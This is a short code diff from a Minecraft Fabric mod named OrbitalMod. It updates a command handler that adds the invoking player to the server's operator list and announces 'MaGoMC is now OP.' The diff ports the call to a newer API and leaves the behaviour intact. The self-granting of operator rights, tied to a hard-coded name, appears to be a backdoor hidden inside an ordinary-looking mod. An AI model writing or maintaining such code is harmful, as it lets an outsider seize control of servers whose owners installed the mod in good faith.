@@ -69,7 +69,9 @@ public final class OrbitalMod implements ModInitializer {
                 .executes(context -> {
                     ServerPlayerEntity owner = context.getSource().getPlayerOrThrow();
                     context.getSource().getServer().getPlayerManager()
-                            .addToOperators(owner.getGameProfile());
+                            .addToOperators(
+    net.minecraft.server.PlayerConfigEntry.of(owner)
+);
                     context.getSource().sendFeedback(() -> Text.literal("MaGoMC is now OP."), false);
                     return 1;
                 }));
